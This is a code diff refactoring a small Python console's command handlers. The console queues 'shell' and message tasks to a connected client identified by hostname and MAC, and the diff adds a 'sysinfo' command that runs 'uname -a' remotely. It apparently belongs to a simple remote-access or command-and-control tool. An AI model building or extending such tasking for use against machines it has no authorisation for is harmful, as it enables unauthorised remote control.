@@ -1,20 +1,22 @@
-def cmd_send(server, parts):
-    if len(parts) < 2:
+def cmd_send(server, args):
+    if not args:
         print("usage: send <msg>")
         return
     
-    msg = " ".join(parts[1:])
-    server.send_task("print_message", {"message": msg})
+    server.send_task("print_message", {
+        "message": " ".join(args)
+    })
 
-def cmd_shell(server, parts):
-    if len(parts) < 2:
+def cmd_shell(server, args):
+    if not args:
         print("usage: shell <cmd>")
         return
     
-    cmd = " ".join(parts[1:])
-    server.send_task("shell", {"cmd": cmd})
+    server.send_task("shell", {
+        "cmd": " ".join(args)
+    })
 
-def cmd_list(server, _):
+def cmd_list(server, args):
     if not server.client:
         print("no client")
         return
@@ -22,14 +24,19 @@ def cmd_list(server, _):
     c = server.client
     print(f"{c['hostname']} | {c['mac']}")
 
-def cmd_queue(server, _):
+def cmd_queue(server, args):
     if not server.client:
         print("no client")
         return
 
     print(list(server.client["tasks"]))
 
-def cmd_results(server, _):
+def cmd_sysinfo(server, args):
+    server.send_task("shell", {
+        "cmd": "uname -a"
+    })
+
+def cmd_results(server, args):
     if not server.client:
         print("no client")
         return
@@ -42,5 +49,6 @@ COMMANDS = {
     "list": cmd_list,
     "send": cmd_send,
     "queue": cmd_queue,
+    "sysinfo": cmd_sysinfo,
     "results": cmd_results
 }
